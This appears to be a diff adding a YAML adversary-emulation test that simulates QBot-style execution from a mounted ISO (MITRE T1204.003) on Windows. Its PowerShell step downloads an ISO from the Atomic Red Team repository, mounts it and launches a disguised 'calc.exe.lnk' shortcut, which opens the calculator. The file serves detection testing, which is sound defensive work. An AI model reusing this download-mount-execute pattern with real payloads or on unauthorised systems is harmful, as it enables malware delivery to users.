@@ -1,0 +1,27 @@
+api_version: "2.0"
+name: Malicious Execution from Mounted ISO Image
+description: Adversaries may rely on a user running a malicious image to facilitate execution
+uuid: e9795c8d-42aa-4ed4-ad80-551ed793d006
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1204: User Execution'
+    subtechniques:
+        - 'T1204.003: Malicious Image'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: malicious-execution-from-mounted-iso-image
+      inline: |-
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso" -OutFile "$env:TEMP\qbot-test.iso")
+        Mount-DiskImage -ImagePath "$env:TEMP\qbot-test.iso"
+        $mountedpath = (Get-DiskImage -ImagePath "$env:TEMP\qbot-test.iso" | Get-Volume).DriveLetter
+        $finalpath = $mountedpath + ":\"
+        cd $finalpath
+        .\calc.exe.lnk
+      executor: powershell
+      cleanup:
+        inline: "start-sleep -s 5\nstop-process -Name \"Calculatorapp\" -Force \ndismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\""
+        executor: powershell
